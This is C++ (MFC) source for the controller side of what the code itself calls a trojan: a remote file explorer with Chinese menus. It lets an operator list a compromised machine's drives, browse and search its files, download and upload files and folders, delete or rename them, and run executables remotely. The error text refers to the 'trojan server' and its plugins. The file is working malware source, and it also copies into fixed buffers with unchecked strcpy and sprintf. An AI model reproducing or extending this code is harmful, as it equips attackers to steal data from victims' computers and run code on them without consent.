// RemoteExplorer.cpp : implementation file
//

#include "stdafx.h"
#include "resource.h"
#include "RemoteExplorer.h"
#include "RemotePlugin.h"
#include "macro.h"

using namespace std;


class CMyRenameDlg : public CDialog
{
	DECLARE_DYNAMIC(CMyRenameDlg)

public:
	CMyRenameDlg(CWnd* pParent = NULL, CString str = "重命名"); 
	virtual ~CMyRenameDlg();

	enum { IDD = IDD_DIALOG_RENAME };

	virtual BOOL OnInitDialog();

	CString GetFileName()const {return filename;}
	void SetFileName(CString str){filename = str;}

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()

private:
	CString filename;
	CString caption;
};

IMPLEMENT_DYNAMIC(CMyRenameDlg, CDialog)
CMyRenameDlg::CMyRenameDlg(CWnd* pParent /*=NULL*/, CString str) : 
	CDialog(CMyRenameDlg::IDD, pParent), filename(_T("")), caption(str)
{
}

CMyRenameDlg::~CMyRenameDlg()
{
}

BOOL CMyRenameDlg::OnInitDialog()
{
	SetWindowText(caption);
	return CDialog::OnInitDialog();
}
void CMyRenameDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_VALUE, filename);
	DDV_MaxChars(pDX, filename, 250);
}


BEGIN_MESSAGE_MAP(CMyRenameDlg, CDialog)
END_MESSAGE_MAP()

CString g_FileWithPath;	//包含路径的文件名
CString g_FileName;	//不包含路径的文件名
static CString g_CopiedFile;//所复制的文件(包括全路径)
static CString g_CopiedPath;//所复制的文件所在的路径
static CString g_CopiedFileWithoutPath;//所复制的文件(不包括全路径)
static bool canPaste = false;

// RemoteExplorer

IMPLEMENT_DYNCREATE(RemoteExplorer, CFormView)

RemoteExplorer::RemoteExplorer()
	: CFormView(RemoteExplorer::IDD)
{
}

RemoteExplorer::~RemoteExplorer()
{
}

void RemoteExplorer::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);

	DDX_Control(pDX, IDC_UP_DIR, m_btnUpDir);
	DDX_Control(pDX, IDC_REFRESH_DIR, m_btnRefresh);
	DDX_Control(pDX, IDC_SEARCH_DIR, m_btnSearch);
	DDX_Control(pDX, IDC_COMBO_DIR, m_comDir);
}

BEGIN_MESSAGE_MAP(RemoteExplorer, CFormView)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_DIR, OnDblclkItem)
	ON_NOTIFY(NM_RETURN, IDC_LIST_DIR, OnDblclkItem)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DIR, OnRclickItem)
	ON_BN_CLICKED(IDC_UP_DIR, OnUpDir)
	ON_BN_CLICKED(IDC_REFRESH_DIR, OnRefreshDir)
	ON_BN_CLICKED(IDC_SEARCH_DIR, OnSearchFile)
	ON_CBN_SELCHANGE(IDC_COMBO_DIR, OnSelChangeComBox)

	ON_COMMAND(ID_DIR_RIGHT_OPEN, OnOpenDir)
	ON_COMMAND(ID_DIR_FIND_FILE, OnSearchFile)
	ON_COMMAND(ID_DIR_RIGHT_DELETE, OnDeleteFile)
	ON_COMMAND(ID_DIR_RIGHT_RENAME, OnRenameFile)
	ON_COMMAND(ID_DIR_RIGHT_DOWNLOAD, OnDownloadFile)
	ON_COMMAND(ID_DIR_RIGHT_CREATE, OnCreateDir)
	ON_COMMAND(ID_DIR_RIGHT_UPLOAD,OnUploadFile)
	ON_COMMAND(ID_DIR_RIGHT_UPLOAD2,OnUploadDir)
	ON_COMMAND(ID_DIR_RIGHT_BACK, OnUpDir)
	ON_COMMAND(ID_DIR_RIGHT_REFRESH, OnRefreshDir)
	ON_COMMAND(ID_DIR_RIGHT_COPY, OnCopyFile)
	ON_COMMAND(ID_DIR_RIGHT_PASTE, OnPasteFile)
	ON_COMMAND(ID_DIR_RIGHT_EXEC_SHOW, OnExecFile)


END_MESSAGE_MAP()


// RemoteExplorer diagnostics

#ifdef _DEBUG
void RemoteExplorer::AssertValid() const
{
	CFormView::AssertValid();
}

#ifndef _WIN32_WCE
void RemoteExplorer::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif
#endif //_DEBUG

void RemoteExplorer::OnSize(UINT nType, int cx, int cy) 
{
	CFormView::OnSize(nType, cx, cy);

	CRect rect;
	GetClientRect(&rect);
	CRect rect0, rect1, rect2, rect3;
	CWnd* pWnd;
	int W = rect.Width(), H = rect.Height();
	int L = rect.left, R = rect.right, B = rect.bottom, T = rect.top;
	int width = 18, height = 18;
	int offsetX = 6, offsetY = 8;

	//重新排列各个控件的相对关系

	pWnd = this->GetDlgItem(IDC_SEARCH_DIR);
	if( pWnd != NULL)
		pWnd->MoveWindow(R-offsetX-width, T+offsetY, width, height);		

	pWnd = this->GetDlgItem(IDC_REFRESH_DIR);
	if( pWnd != NULL)
		pWnd->MoveWindow(R-(offsetX+width)*2, T+offsetY, width, height);		

	pWnd = this->GetDlgItem(IDC_UP_DIR);
	if( pWnd != NULL)
		pWnd->MoveWindow(R-(offsetX+width)*3, T+offsetY, width, height);

	pWnd = this->GetDlgItem(IDC_COMBO_DIR);
	if( pWnd != NULL)
		pWnd->MoveWindow(L+offsetX, T+offsetY, W-(offsetX+width)*3-offsetX, height);

	pWnd = this->GetDlgItem(IDC_LIST_DIR);
	if( pWnd != NULL)
		pWnd->MoveWindow(L+offsetX, T+offsetY+height, W, H-height-offsetY);

}

void RemoteExplorer::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();
	GetParentFrame()->RecalcLayout();
	ResizeParentToFit();

	m_btnUpDir.SetIcon(IDI_ICON_UPDIR);
	m_btnUpDir.SetTooltipText(_T("回到上层目录"));
	m_btnRefresh.SetIcon(IDI_ICON_REFRESH);
	m_btnRefresh.SetTooltipText(_T("刷新当前目录"));
	m_btnSearch.SetIcon(IDI_ICON_T_FIND);
	m_btnSearch.SetTooltipText(_T("搜索文件或者目录"));
	
	m_imgList.Create(16, 16, ILC_COLOR8|ILC_MASK, 6, 100);
	for(int n = IDI_ICON1; n <= IDI_ICON6;  n++)
		m_imgList.Add(AfxGetApp()->LoadIcon(n));
	m_listCtrl.Create(//WS_VISIBLE|LVS_REPORT|LVS_EDITLABELS, 
		WS_CHILD|WS_TABSTOP|WS_VISIBLE|WM_VSCROLL,
		CRect(100, 100, 300, 300), this, IDC_LIST_DIR);
	m_listCtrl.SetImageList(&m_imgList, LVSIL_SMALL);
	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EDITLABELS);

	SetColumn(true);
}

void RemoteExplorer::OnDblclkItem(NMHDR* pNMHDR, LRESULT* pResult)
{
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition(); 
	if(NULL == pos)	return; 
	int n= m_listCtrl.GetNextSelectedItem(pos); 

	CString name = m_listCtrl.GetItemText(n, 0);
	CString type = m_listCtrl.GetItemText(n, 1);
	if(type == "文件")	return;

	CString path;
	if(CString(g_Path) == "./")	path = name;
	else	path = CString(g_Path) + "\\" + name;
	KDebug("current path %s", path);

	RemotePlugin::OnRedirectDir(path);
}

CString RemoteExplorer::GetSelectedFile()
{
	if(m_listCtrl.GetSelectedCount() > 0)
	{
		int nItem = m_listCtrl.GetNextItem(-1, LVNI_SELECTED);
		g_FileName = m_listCtrl.GetItemText(nItem, 0);
		CString type = m_listCtrl.GetItemText(nItem, 1);
		CString path = g_Path;

		if(path == "./")	return g_FileName;
		else return CString(g_Path) + "\\" + g_FileName;
	}
	else
	{
		g_FileName = CString(g_Path);
		return "";
	}
}

void RemoteExplorer::OnRclickItem(NMHDR* pNMHDR, LRESULT* pResult)
{
	CMenu menu;
	if(m_listCtrl.GetSelectedCount() > 0)
	{
		int nItem = m_listCtrl.GetNextItem(-1, LVNI_SELECTED);
		g_FileName = m_listCtrl.GetItemText(nItem, 0);
		CString type = m_listCtrl.GetItemText(nItem, 1);
		CString path = g_Path;

		if(path == "./")
		{
			//磁盘
			menu.CreatePopupMenu();
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_OPEN,"打开");
			menu.AppendMenu(MF_STRING,ID_DIR_FIND_FILE,"搜索文件");
			menu.AppendMenu(MF_SEPARATOR);
			//menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_ATTRIB,"属性");

			g_FileWithPath = g_FileName;
		}
		else if(type == "文件夹")
		{
			//目录
			menu.CreatePopupMenu();
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_OPEN,"打开");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_DELETE,"删除");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_RENAME,"重命名");
			menu.AppendMenu(MF_SEPARATOR);
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_COPY, "复制");
			if(canPaste)	menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_PASTE, "粘贴");
			else			menu.AppendMenu(MF_STRING|MF_DISABLED|MF_GRAYED,ID_DIR_RIGHT_PASTE, "粘贴");			
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_DOWNLOAD,"下载");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_UPLOAD,"上传文件");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_UPLOAD2,"上传目录");
			menu.AppendMenu(MF_SEPARATOR);
			menu.AppendMenu(MF_STRING,ID_DIR_FIND_FILE,"搜索文件");
			//menu.AppendMenu(MF_SEPARATOR);
			//menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_ATTRIB,"属性");

			g_FileWithPath = CString(g_Path) + "\\" + g_FileName;
		}
		else
		{
			//文件
			menu.CreatePopupMenu();
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_DELETE,"删除");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_RENAME,"重命名");
			menu.AppendMenu(MF_SEPARATOR);
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_COPY, "复制");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_DOWNLOAD,"下载");
			menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_EXEC_SHOW,"远程运行");
			//menu.AppendMenu(MF_SEPARATOR);
			//menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_ATTRIB,"属性");

			g_FileWithPath = CString(g_Path) + "\\" + g_FileName;
		}
	}
	else
	{
		CString path = g_Path;
		if(path == "./")	return;
			
		menu.CreatePopupMenu();
		menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_BACK,"后退");
		menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_REFRESH,"刷新");
		menu.AppendMenu(MF_SEPARATOR);
		menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_UPLOAD,"上传文件");
		menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_UPLOAD2,"上传目录");
		menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_CREATE,"新建文件夹");
		if(canPaste)	menu.AppendMenu(MF_STRING,ID_DIR_RIGHT_PASTE, "粘贴");
		else			menu.AppendMenu(MF_STRING|MF_DISABLED|MF_GRAYED,ID_DIR_RIGHT_PASTE, "粘贴");

		g_FileName = g_FileWithPath = CString(g_Path);
	}

	CPoint pt;
	GetCursorPos(&pt);
	menu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, this);
	menu.DestroyMenu();
}

void RemoteExplorer::OnUpDir()
{
	CString parentDir;
	CString path = g_Path;
	
	//如果是总根目录
	if(path == "./")	return;

	int index = path.ReverseFind('\\');
	if(index < 0) parentDir = "./";//当前路径为某个驱动器比如C盘
	else parentDir = path.Left(index);//其他路径
	RemotePlugin::OnRedirectDir(parentDir);
}

void RemoteExplorer::OnRefreshDir()
{
	RemotePlugin::OnRedirectDir(g_Path);
}


void RemoteExplorer::OnSelChangeComBox()
{
	int idx = m_comDir.GetCurSel();
	if(idx == -1)	return;

	CString path;
	m_comDir.GetLBText(idx, path);

	if(path.Compare(g_LastPath) != 0)
		RemotePlugin::OnRedirectDir(path);
}

void RemoteExplorer::SetColumn(bool isDisk)
{
	m_listCtrl.DeleteAllItems();
	while(m_listCtrl.GetHeaderCtrl()->GetItemCount() > 0)
		m_listCtrl.DeleteColumn(0);

	if(isDisk)
	{
		m_listCtrl.InsertColumn(0, "名称", LVCFMT_LEFT, 140);
		m_listCtrl.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
		m_listCtrl.InsertColumn(2, "大小", LVCFMT_RIGHT, 100);
		m_listCtrl.InsertColumn(3, "可用空间", LVCFMT_RIGHT, 100);
	}
	else
	{
		m_listCtrl.InsertColumn(0, "名称", LVCFMT_LEFT, 250);
		m_listCtrl.InsertColumn(1, "类型", LVCFMT_LEFT, 80);
		m_listCtrl.InsertColumn(2, "大小", LVCFMT_RIGHT, 60);
		m_listCtrl.InsertColumn(3, "修改时间", LVCFMT_RIGHT, 150);
		m_listCtrl.InsertColumn(4, "所在目录", LVCFMT_LEFT, 120);
	}
}

void RemoteExplorer::FindImageIconId(const char* name,int &nImage)
{
	char extName[5] = {0};
	char itemName[256] = {0};
	strcpy(itemName, name);
	memset(extName, 0, sizeof(extName));
	memcpy(extName, &itemName[strlen(itemName) - 4],4);
	_strupr(extName);

	for(list<ICONINFO>::iterator it = m_list.begin(); it != m_list.end(); it++)
	{
		ICONINFO* pItem = &(*it);
		if(!strcmp(pItem->ext, extName))
		{
			nImage = pItem->index;
			return;
		}
	}

	SHFILEINFO m_Info = {0};
	DWORD ret = SHGetFileInfo(itemName, FILE_ATTRIBUTE_NORMAL, &m_Info,sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_ICON |SHGFI_USEFILEATTRIBUTES);
	nImage = m_imgList.Add(m_Info.hIcon);
	m_imgList.SetOverlayImage(nImage, 1);
	
	ICONINFO newItem;
	strcpy(newItem.ext, extName);
	newItem.index = nImage;
	m_list.push_back(newItem);
}

CString GetSizeString(__int64 fileSize)
{
	char strFileSize[50];
	if(fileSize < 1024)
		sprintf(strFileSize, "%d B", fileSize);
	else if(fileSize < 1024*1024)
		sprintf(strFileSize, "%d KB", fileSize/1024);
	else if(fileSize < 1024*1024*1024)
		sprintf(strFileSize, "%d MB", fileSize/(1024*1024));
	else
		sprintf(strFileSize, "%.1f GB", 1.0*fileSize/(1024*1024*1024));
	return strFileSize;
}

bool RemoteExplorer::InsertDrive(void* p)
{
	partition_info*	info = (partition_info*)p;
	char name[256];
	__int64 totalSize,freeSize; 
	int nImage = 0;
	char itemType[20] = {0};
	int nItem;

	strcpy(name, info->name);

	if(info->driveType == IS_CDROM)
	{
		nImage = 1;
		strcpy(itemType,"光驱");
	}
	else if(info->driveType == IS_REMOVABLE)
	{
		nImage = 5;
		strcpy(itemType,"可移动驱动器");
	}
	else if(info->driveType == IS_REMOTE)
	{
		nImage = 4;
		strcpy(itemType,"网络磁盘");
	}
	else 
	{
		nImage = 3;
		strcpy(itemType,"本地磁盘");
	}

	nItem = m_listCtrl.InsertItem(m_listCtrl.GetItemCount(), name, nImage);
	if(nItem == -1)	return false;

	m_listCtrl.SetItemText(nItem, 1, itemType);

	totalSize = ((__int64)info->highTotalBytes << 32) + info->lowTotalBytes;
	m_listCtrl.SetItemText(nItem, 2, GetSizeString(totalSize));
	
	freeSize = ((__int64)info->highFreeBytes << 32) + info->lowFreeBytes;
	m_listCtrl.SetItemText(nItem, 3, GetSizeString(freeSize));

	m_listCtrl.Update(nItem);

	//m_comDir.SetItemHeight(m_comDir.GetCount(), 30);
	m_comDir.InsertString(m_comDir.GetCount(), name);
	m_Drives.push_back(name);

	return true;
}

bool RemoteExplorer::InsertFileOrDir(void* p)
{
	dir_info* info = (dir_info*)p;
	char name[MAX_PATH] = {0}, path[MAX_PATH] = {0};
	char itemType[20] = {0};
	int nImage = 0;
	int nItem;
	FILETIME fTime;
	SYSTEMTIME stTime;
	char szDate[20], szTime[20], strTime[40];
	__int64 fileSize;

	if(RemotePlugin::DetachPathAndFile(info->name, path, name) < 0)
	{
		strcpy(name, info->name);
		strcpy(path, g_Path);
	}

	if(info->fileType == IS_FILE)
	{
		FindImageIconId(name, nImage);
		strcpy(itemType,"文件");
	}
	else
	{
		nImage = 2;
		strcpy(itemType,"文件夹");
	}

	nItem = m_listCtrl.InsertItem(m_listCtrl.GetItemCount(), name, nImage);
	if(nItem == -1)	return false;

	m_listCtrl.SetItemText(nItem, 1, itemType);
	
	if(info->fileType == IS_FILE)
	{
		fileSize = ((__int64)info->fileSizeHigh << 32) + info->fileSizeLow;
		m_listCtrl.SetItemText(nItem, 2, GetSizeString(fileSize));
	}
	
	fTime.dwHighDateTime = info->highDateTime;
	fTime.dwLowDateTime = info->lowDateTime;
	FileTimeToLocalFileTime(&fTime, &fTime);
	FileTimeToSystemTime(&fTime, &stTime);
	GetDateFormat(LOCALE_SYSTEM_DEFAULT, NULL, &stTime, "yyyy-MM-dd ", szDate, 12); 
	GetTimeFormat(LOCALE_SYSTEM_DEFAULT, NULL, &stTime, "HH:mm:ss", szTime, 10);
	sprintf(strTime, "%s%s", szDate, szTime);
	
	m_listCtrl.SetItemText(nItem, 3, strTime);

	m_listCtrl.SetItemText(nItem, 4, path);

	m_listCtrl.Update(nItem);
	return true;
}


bool RemoteExplorer::InsertItem(WPARAM wp, LPARAM lp)
{
	DispatchData*	data = (DispatchData*)wp;
	control_header* header = data->recvData.header;
	void* body = data->recvData.body;
	bool isDisk = header->command == CONTROL_ENUM_DISKS;

	if(isDisk)
	{
		partition_info* drives = (partition_info*)body;
		int nDrives = header->dataLen / sizeof(partition_info);

		SetColumn(true);
		m_comDir.ResetContent();
		m_Drives.clear();
		for(int i = 0; i < nDrives; i++)
			InsertDrive(&drives[i]);
	}
	else
	{
		dir_info* files = (dir_info*)body;
		if(header->dataLen < 0)	return true;
		if(header->seq == 0 || header->seq == 1)
			SetColumn(false);
		
		int nFiles = header->dataLen / sizeof(dir_info);
		for(int i = 0; i < nFiles; i++)
			InsertFileOrDir(&files[i]);

		int nCount = 0;
		for(nCount = 0; nCount < m_Drives.size(); nCount++)
			if(m_Drives[nCount].Compare(g_Path) == 0)
				break;
		if(nCount == m_Drives.size())
		{
			if(m_comDir.GetCount() == nCount + 1)
				m_comDir.DeleteString(nCount);
			m_comDir.InsertString(nCount, g_Path);
		}
		m_comDir.SetCurSel(nCount);
	}
	
	return true;

	//m_listCtrl.SetItemData(nItem, pItem->m_ItemType);
}

// RemoteExplorer message handlers

void RemoteExplorer::OnFileOperationCompleted(unsigned short cmd)
{
	if(cmd == CONTROL_COPY_FILE)	
	{
		canPaste = false;
		MessageBox("文件复制完毕！", "远程文件操作", MB_OK|MB_ICONEXCLAMATION);
	}
	else if(cmd == CONTROL_END_TRANSFER) 
		MessageBox("文件传送完毕！", "远程文件操作", MB_OK|MB_ICONEXCLAMATION);

	OnRefreshDir();
}

void RemoteExplorer::OnFileOperationFailed(unsigned short cmd, unsigned short resp)
{
	CString errMsg;
	if(resp == ERR_NOTHISMODULE)
		errMsg = "木马服务端不支持该模块，请上传相应的插件";
	else if(resp == ERR_INVPARA)
		errMsg = "参数不正确，不合法的命令";
	else if(resp == ERR_NOTFIND)
		errMsg = "文件或者目录不存在";
	else if(resp == ERR_DENIED)
		errMsg = "没有权限操作";
	else if(resp == ERR_EXIST)
		errMsg = "文件或者目录已经存在";
	else if(resp == ERR_NOPATH)
		errMsg = "路径不存在";
	else if(resp == ERR_FAILGETDISK)
		errMsg = "读取磁盘信息失败";
	else if(resp == ERR_FAILJOB)
		errMsg = "内部创建工作线程失败";
	else if(resp == ERR_FAILCONN)
		errMsg = "文件传输连接失败";
	else
		errMsg = "未知错误";
	MessageBox(errMsg, "远程文件操作", MB_OK|MB_ICONHAND);
}

void RemoteExplorer::OnOpenDir()
{
	RemotePlugin::OnRedirectDir(g_FileWithPath);
}

void RemoteExplorer::OnCreateDir()
{
	CMyRenameDlg dlg(NULL, "新建目录");
	if(dlg.DoModal() != IDOK) return;

	union fileop_info info;
	sprintf(info.fileName, "%s\\%s", g_FileWithPath, dlg.GetFileName());
	RemotePlugin::OnFileOperation(CONTROL_CREATE_DIR, &info, sizeof(info));
}

void RemoteExplorer::OnRenameFile()
{
	CMyRenameDlg dlg(NULL, "重命名文件");
	dlg.SetFileName(g_FileName);
	if(dlg.DoModal() != IDOK) return;
	if(dlg.GetFileName() == g_FileName)	return;

	union fileop_info info;
	strcpy(info.renameInfo.oldFile, g_FileWithPath);
	sprintf(info.renameInfo.newFile, "%s\\%s", g_Path, dlg.GetFileName());
	RemotePlugin::OnFileOperation(CONTROL_RENAME_FILE, &info, sizeof(info));
}

void RemoteExplorer::OnDeleteFile()
{
	if(g_FileWithPath == "")
	{
		MessageBox("没有选择任何文件删除", "远程文件操作", MB_OK|MB_ICONHAND);
		return;
	}
	
	if(MessageBox("真要删除?","删除", MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
		return;

	union fileop_info info;
	strcpy(info.fileName, g_FileWithPath); 
	RemotePlugin::OnFileOperation(CONTROL_DELETE_FILE, &info, sizeof(info));
}

void RemoteExplorer::OnExecFile()
{
	union fileop_info info;
	strcpy(info.fileName, g_FileWithPath); 
	RemotePlugin::OnFileOperation(CONTROL_RUN_FILE, &info, sizeof(info));
}

static BOOL GetSelectedDir(const char* title, HWND wnd, char* path)
{
	BROWSEINFO bi;   
	bi.hwndOwner = wnd;   
	bi.pidlRoot = NULL;   
	bi.pszDisplayName = path;   
	bi.lpszTitle = title;   
	bi.ulFlags = 0;   
	bi.lpfn = NULL;   
	bi.lParam = 0;   
	bi.iImage = 0;   
	LPITEMIDLIST lp = SHBrowseForFolder(&bi);   

	if(lp && SHGetPathFromIDList(lp, path))  
		return TRUE;
	return FALSE;
}

void RemoteExplorer::OnDownloadFile()
{
	char szPath[MAX_PATH];
	ZeroMemory(szPath, sizeof(szPath)); 

	if(GetSelectedDir("请选择需要存放的目录：", m_hWnd, szPath) == TRUE)
	{
		union fileop_info info;
		strcpy(info.ftpInfo.clientFile, szPath);
		strcpy(info.ftpInfo.trojanFile, g_FileWithPath);
		
		RemotePlugin::OnFileOperation(CONTROL_DOWNLOAD_FILE, &info, sizeof(info));
	}
}

void RemoteExplorer::OnUploadFile()
{
	const char* szFilter = "All Files (*.*)|*.*||";
	CFileDialog dlg(TRUE, NULL ,"C:\\test" ,OFN_ENABLESIZING ,szFilter,NULL); 
	if(dlg.DoModal() == IDOK)
	{
		union fileop_info info;
		strcpy(info.ftpInfo.clientFile, dlg.GetPathName());
		strcpy(info.ftpInfo.trojanFile, g_FileWithPath);
		
		RemotePlugin::OnFileOperation(CONTROL_UPLOAD_FILE, &info, sizeof(info));
	}
}

void RemoteExplorer::OnUploadDir()
{
	char szPath[MAX_PATH];
	ZeroMemory(szPath, sizeof(szPath)); 

	if(GetSelectedDir("请选择需要上传的目录：", m_hWnd, szPath) == TRUE)
	{
		union fileop_info info;
		strcpy(info.ftpInfo.clientFile, szPath);
		strcpy(info.ftpInfo.trojanFile, g_FileWithPath);
		
		RemotePlugin::OnFileOperation(CONTROL_UPLOAD_FILE, &info, sizeof(info));
	}

}

void RemoteExplorer::OnCopyFile()
{
	g_CopiedFile = g_FileWithPath;
	g_CopiedPath = g_Path;
	g_CopiedFileWithoutPath = g_FileName;
	canPaste = true;
}

void RemoteExplorer::OnPasteFile()
{
	union fileop_info info;
	strcpy(info.copyInfo.oldFile, g_CopiedFile);

	if(g_FileWithPath == g_CopiedPath)
		sprintf(info.copyInfo.newFile, "%s\\副本%s", g_CopiedPath, g_CopiedFileWithoutPath);
	else
		sprintf(info.copyInfo.newFile, "%s\\%s", g_Path, g_CopiedFileWithoutPath);

	KDebug("%s ---> %s", info.copyInfo.oldFile, info.copyInfo.newFile);
	RemotePlugin::OnFileOperation(CONTROL_COPY_FILE, &info, sizeof(info));
}

void RemoteExplorer::OpenDirOrExecuteFile()
{
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition(); 
	if(NULL == pos)	return; 
	int n= m_listCtrl.GetNextSelectedItem(pos); 

	CString name = m_listCtrl.GetItemText(n, 0);
	CString type = m_listCtrl.GetItemText(n, 1);
	if(type == "文件")
	{
		if(name.Right(4).CompareNoCase(".exe") == 0)	
			OnExecFile();
		return;
	}

	CString path;
	if(CString(g_Path) == "./")	path = name;
	else	path = CString(g_Path) + "\\" + name;
	KDebug("current path %s", path);

	RemotePlugin::OnRedirectDir(path);
}

BOOL RemoteExplorer::PreTranslateMessage(MSG* pMsg)
{
	if(WM_KEYFIRST <= pMsg->message && pMsg->message <= WM_KEYLAST)
	{
		g_FileWithPath = GetSelectedFile();
		switch(pMsg->wParam)
		{
		case VK_DELETE:	OnDeleteFile(); break;
		//case VK_F5:		OnRefreshDir();	break;
		case VK_BACK:	OnUpDir();		break;
		//case VK_RETURN:	OpenDirOrExecuteFile();	break;
		default:		CFormView::PreTranslateMessage(pMsg); break;
		}
		Sleep(500);
		return TRUE;
	}

	return CFormView::PreTranslateMessage(pMsg);
}


class CMyFindFileDlg : public CDialog
{
	// Construction
public:
	CMyFindFileDlg(CWnd* parent , CString dirName);   
	
	enum { IDD = IDD_DIALOG_FINDFILE };

	CString GetSearchPattern()const{return pattern; }

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

protected:
	//virtual void OnOK();
	//virtual BOOL OnInitDialog();
	DECLARE_MESSAGE_MAP()

private:
	CString	dir;
	CString	pattern;
};

CMyFindFileDlg::CMyFindFileDlg(CWnd* parent, CString dirName) 
: CDialog(CMyFindFileDlg::IDD, parent)
{
	dir = dirName;
	pattern = _T("");
}


void CMyFindFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_DIR, dir);
	DDV_MaxChars(pDX, dir, 255);
	DDX_Text(pDX, IDC_EDIT_FILE, pattern);
	DDV_MaxChars(pDX, pattern, 255);
}


BEGIN_MESSAGE_MAP(CMyFindFileDlg, CDialog)
END_MESSAGE_MAP()

void RemoteExplorer::OnSearchFile()
{
	CMyFindFileDlg dlg(NULL, g_Path);
	if(dlg.DoModal() == IDOK && !dlg.GetSearchPattern().IsEmpty())
	{
		union fileop_info info;
		strcpy(info.searchInfo.dir, g_Path);
		strcpy(info.searchInfo.pattern, dlg.GetSearchPattern());
		RemotePlugin::OnFileOperation(CONTROL_SEARCH_FILE, &info, sizeof(info));
	}
}